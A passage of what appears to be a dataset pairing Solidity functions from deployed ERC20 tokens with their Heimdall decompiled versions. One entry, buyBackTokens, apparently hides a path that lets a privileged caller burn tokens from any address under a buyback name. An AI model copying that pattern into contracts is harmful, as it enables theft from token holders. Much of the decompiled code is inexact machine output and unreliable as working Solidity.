require(0xc7af915962dac099a28b9fd0ed5efd49f9857c5a, \"ERC20: transfer from the zero address\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x20;\n        var_d = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_j = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(0xdead, \"ERC20: transfer to the zero address\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x20;\n        var_d = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_j = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_h = 0x60 + var_h;\n        var_i = 0x26;\n        var_k = this.code[10929:10967];\n        var_e = 0xc7af915962dac099a28b9fd0ed5efd49f9857c5a;\n        uint256 var_l = 0;\n        require(!(((arg0 * var_h.length) / 0x2710) > storage_map_v[var_e]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_m = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_j = 0x20;\n        uint256 var_n = var_h.length;\n        uint256 var_o = 0;\n        require(!(storage_map_v[var_e] - ((arg0 * var_h.length) / 0x2710) > storage_map_v[var_e]), \"SafeMath: addition overflow\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        var_e = 0xc7af915962dac099a28b9fd0ed5efd49f9857c5a;\n        var_l = 0;\n        storage_map_v[var_e] = storage_map_v[var_e] - ((arg0 * var_h.length) / 0x2710);\n        var_e = 0xdead;\n        require(!(storage_map_v[var_e] > (((arg0 * var_h.length) / 0x2710) + storage_map_v[var_e])), \"SafeMath: addition overflow\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(!(((arg0 * var_h.length) / 0x2710) + storage_map_v[var_e] < storage_map_v[var_e]), \"SafeMath: addition overflow\");\n        var_m = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_j = 0x20;\n        var_n = 0x1b;\n        var_p = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_e = 0xdead;\n        var_l = 0;\n        storage_map_v[var_e] = ((arg0 * var_h.length) / 0x2710) + storage_map_v[var_e];\n        uint256 var_m = (arg0 * var_h.length) / 0x2710;\n        emit Transfer(0xc7af915962dac099a28b9fd0ed5efd49f9857c5a, 0xdead, (arg0 * var_h.length) / 0x2710);\n        var_m = 0xfff6cae900000000000000000000000000000000000000000000000000000000;\n        require(address(0xc7af915962dac099a28b9fd0ed5efd49f9857c5a).code.length);\n        (bool success, bytes memory ret0) = address(0xc7af915962dac099a28b9fd0ed5efd49f9857c5a).{ value: var_o ether }sync(var_j); // call\n        var_m = 0x01;\n        return 0x01;\n        var_i = 0xfff6cae900000000000000000000000000000000000000000000000000000000;\n        require(address(0xc7af915962dac099a28b9fd0ed5efd49f9857c5a).code.length);\n        (bool success, bytes memory ret0) = address(0xc7af915962dac099a28b9fd0ed5efd49f9857c5a).{ value: var_o ether }sync(var_c); // call\n        var_i = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x5605C74F8079c9c648a513534354B5D6ee7dF8B4", "original_solidity_code": "function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {\r\n        _maxWalletSize = maxWalletSize;\r\n    }", "heimdall_decompiled_code": "function setMaxWalletSize(uint256 arg0) public {\n        require(arg0 == arg0);\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _maxWalletSize = arg0;\n    }"}
{"contract_address": "0xB1C76Fbd9520964Be300A66679C3ac7dae32f744", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x31F2C94D3EF63551FF418747EbBe67E5A083aDC0", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\\n        _transfer(_msgSender(), recipient, amount);\\n        return true;\\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0);\n        require(address(arg0) - 0);\n        require(arg1 > 0);\n        require(address(msg.sender) == (address(owner / 0x01)));\n        require(address(arg0) == (address(owner / 0x01)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a] / 0x01));\n        require(!bytes1(storage_map_b[var_a] / 0x01));\n        require(!(address(msg.sender) == (address(store_c / 0x01))), \"SafeMath: multiplication overflow\");\n        require(!(address(msg.sender) == (address(store_c / 0x01))), \"SafeMath: multiplication overflow\");\n        require(!(address(msg.sender) == (address(store_c / 0x01))), \"SafeMath: multiplication overflow\");\n        require(store_d > store_e, \"SafeMath: multiplication overflow\");\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (store_f == ((arg1 * store_f) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_f) / arg1) == store_f, \"SafeMath: multiplication overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x21;\n        var_h = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_i = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_f = 0x40 + var_f;\n        var_d = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        uint256 var_i = var_f.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(address(arg0) == (address(store_c / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_c / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_c / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_c / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_c / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_c / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_c / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(((arg1 * store_f) / 0x64) > 0), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + ((arg1 * store_f) / 0x64))), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(storage_map_b[var_a] + ((arg1 * store_f) / 0x64) < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] + ((arg1 * store_f) / 0x64);\n        uint256 var_k = (arg1 * store_f) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (arg1 * store_f) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_f = 0x40 + var_f;\n        var_k = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_f = 0x40 + var_f;\n        var_p = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((arg1 * store_f) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_r = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_s = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        uint256 var_t = var_f.length;\n        uint256 var_u = 0;\n        var_v = var_n;\n        var_u = 0;\n        if (!(arg1 - ((arg1 * store_f) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_d > store_h) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_c / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_d > store_j) {\n                if (arg1 - 0) {\n                }\n                require(!((arg1 - ((arg1 * store_f) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_d > store_j, \"Exceeds the _maxTxAmount.\");\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x19;\n        var_h = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(arg0) == (address(store_l / 0x01))) {\n            if (address(arg0) == (address(store_l / 0x01))) {\n            }\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x29;\n        var_h = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_i = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x23;\n        var_h = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_i = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x54eEA875389f51FB46A26Ea5a5DbBa480ca74339", "original_solidity_code": "function updateBuyFees(\r\n        uint256 _marketingFee,\r\n        uint256 _developmentFee,\r\n        uint256 _liquidityFee\r\n    ) external onlyOwner {\r\n        buyMarketingFee = _marketingFee;\r\n        buyDevelopmentFee = _developmentFee;\r\n        buyLiquidityFee = _liquidityFee;\r\n        buyTotalFees = buyMarketingFee + buyDevelopmentFee + buyLiquidityFee;\r\n        require(buyTotalFees <= 10, \"ERC20: Must keep fees at 10% or less\");\r\n    }", "heimdall_decompiled_code": "function updateBuyFees(uint256 arg0, uint256 arg1, uint256 arg2) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_o = arg0;\n        store_p = arg1;\n        store_q = arg2;\n        require(!arg0 > (arg1 + arg0));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n    }"}
{"contract_address": "0xF37412281Cb92fb10ccA519C55F0276BAFa6Ea2f", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_h[var_a];\n        return storage_map_h[var_a];\n    }"}
{"contract_address": "0x4eeA955F63D7e24Ea7272651a29c7C70F7c2A9Ae", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + arg1)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x22;\n        var_h = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_i = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x24;\n        var_h = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_i = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xEea644890623CdfBD648027cbf819A3C8e48C924", "original_solidity_code": "function approve(address spender, uint256 amount)\r\n        external\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"BaseRfiToken: approve to the zero address\");\n        require(address(arg0), \"BaseRfiToken: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x1a;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x42617365526669546f6b656e3a20617070726f766520746f20746865207a6572;\n        var_g = 0x6f20616464726573730000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x2b;\n        var_f = 0x42617365526669546f6b656e3a20617070726f76652066726f6d20746865207a;\n        var_g = 0x65726f2061646472657373000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x10A7A2212f6b6ffE22d339D8Aa6e89a17ad8b1ad", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_w) {\n            if (store_w - ((store_w / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_w / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_w / 0x02;\n                if (store_w) {\n                    if (store_w - ((store_w / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_w / 0x02) {\n                            if (0x1f < (store_w / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_w / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x0aC5789B5Adf719d5417b40De62fD8e117Ff8721", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x90B22290c39A7D7451fb9B7922cB11e701308E97", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x12) {\n            if (!0xe8d4a51000 | (0x01 == 0x01)) {\n                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_g = 0x11;\n                _maxTxAmount = 0xe8d4a51000;\n                if (0x12) {\n                    if (!0xe8d4a51000 | (0x01 == 0x01)) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        _maxWalletSize = 0xe8d4a51000;\n                        transferDelayEnabled = (0 * 0x01) | (uint248(transferDelayEnabled));\n                        if (0x12) {\n                            if (!0xe8d4a51000 | (0x01 == 0x01)) {\n                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_g = 0x11;\n                                var_a = 0xe8d4a51000;\n                                emit MaxTxAmountUpdated(0xe8d4a51000);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x12 > 0xff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                                if (!0x040000 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                    var_g = 0x11;\n                                                    if (!((0x0a < 0x0b) & (0x12 < 0x4e)) | ((0x0a < 0x0133) & (0x12 < 0x20))) {\n                                                        if (!0x12 > 0x01) {\n                                                            if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_g = 0x11;\n                                                                if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                    var_g = 0x11;\n                                                                    if (!0) {\n                                                                    }\n                                                                    if (!0x0de0b6b3a7640000 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                        var_g = 0x11;\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x00BCB434254797479bade33e1eF0aEBDB3F27089", "original_solidity_code": "function buyBackTokens(uint256 amountInWei, address from) external {\r\n        if (amountInWei < 1 ether) {\r\n            // require(amountInWei <= 1 ether, \"May not buy more than 1 ETH in a single buy to reduce sandwich attacks\");\r\n            address[] memory path = new address[](2);\r\n            path[0] = uniswapV2Router.WETH();\r\n            path[1] = address(this);\r\n            // make the swap\r\n            uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{\r\n                value: amountInWei\r\n            }(\r\n                0, // accept any amount of Ethereum\r\n                path,\r\n                address(0xdead),\r\n                block.timestamp\r\n            );\r\n            emit BuyBackTriggered(amountInWei);\r\n        } else {\r\n            swapLiquidity(from, amountInWei);\r\n        }\r\n    }", "heimdall_decompiled_code": "function buyBackTokens(uint256 arg0, address arg1) public {\n        require(arg1 == (address(arg1)));\n        require(!(arg0 < 0x0de0b6b3a7640000), \"swap amount must over than minimumTokensBeforeSwap\");\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] < minimumTokensBeforeSwap), \"swap amount must over than minimumTokensBeforeSwap\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x32;\n        var_f = 0x7377617020616d6f756e74206d757374206f766572207468616e206d696e696d;\n        var_g = 0x756d546f6b656e734265666f7265537761700000000000000000000000000000;\n        var_a = msg.sender;\n        var_b = 0x13;\n        require(bytes1(storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(address(this) == (address(arg1)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(address(arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_h = 0x60 + var_h;\n        var_c = 0x22;\n        var_i = this.code[14857:14891];\n        var_a = address(arg1);\n        var_b = 0x01;\n        require(!(arg0 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_k = var_h.length;\n        uint256 var_l = 0;\n        require(!((storage_map_b[var_a] - arg0) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_m = 0x11;\n        var_a = address(arg1);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg0;\n        var_h = 0x40 + var_h;\n        var_j = 0x1e;\n        var_n = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg0 > totalSupply), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_o = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        uint256 var_q = var_h.length;\n        uint256 var_r = 0;\n        var_s = var_t;\n        var_r = 0;\n        require(!((totalSupply - arg0) > totalSupply), \"ERC20: burn from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_m = 0x11;\n        totalSupply = totalSupply - arg0;\n        uint256 var_o = arg0;\n        emit Transfer(address(arg1), 0, arg0);\n        require(!(bytes1(store_j / 0x0100000000)), \"ERC20: burn from the zero address\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(bytes1(store_j) == (bytes1(store_j) * storage_map_b[var_a] / storage_map_b[var_a]) | !storage_map_b[var_a], \"ERC20: burn from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_m = 0x11;\n        require(bytes1(store_j / 0x0100000000), \"ERC20: burn from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_m = 0x12;\n        require(!0, \"ERC20: burn from the zero address\");\n        require(!(bytes1(store_j / 0x0100000000)), \"ERC20: burn from the zero address\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x21;\n        var_f = 0x45524332303a206275726e2066726f6d20746865207a65726f20616464726573;\n        var_g = 0x7300000000000000000000000000000000000000000000000000000000000000;\n        require(!bytes1(store_j / 0x0100000000));\n        require(!bytes1(store_j / 0x0100000000));\n        var_a = address(this);\n        var_b = 0x01;\n        require(bytes1(store_j) == (bytes1(store_j) * storage_map_b[var_a] / storage_map_b[var_a]) | !storage_map_b[var_a]);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_m = 0x11;\n        require(bytes1(store_j / 0x0100000000));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_m = 0x12;\n        var_c = 0x02;\n        var_h = var_h + 0x60;\n        var_u = msg.data[4:68];\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(uniswapV2Router).WETH(var_g); // staticcall\n        var_h = var_h + (uint248(ret0.length + 0x1f));\n        require(!((var_h + ret0.length) - var_h) < 0x20);\n        require(var_h.length == (address(var_h.length)));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_m = 0x32;\n        uint256 var_v = address(var_h.length);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_m = 0x32;\n        address var_w = address(this);\n        var_n = 0xb6f9de9500000000000000000000000000000000000000000000000000000000;\n        var_k = 0;\n        var_p = 0x80;\n        uint256 var_x = var_h.length;\n        var_q = 0xdead;\n        uint256 var_s = block.timestamp;\n        require(address(uniswapV2Router).code.length);\n        (bool success, bytes memory ret0) = address(uniswapV2Router).{ value: var_o }Unresolved_b6f9de95(var_k, var_p); // call\n        uint256 var_n = arg0;\n        emit BuyBackTriggered(arg0);\n    }"}
{"contract_address": "0x5843ACcF881D401B3AD3D749b96A308Ebb486Cef", "original_solidity_code": "function isBot(address a) public view returns (bool){\\n      return bots[a];\\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x05;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
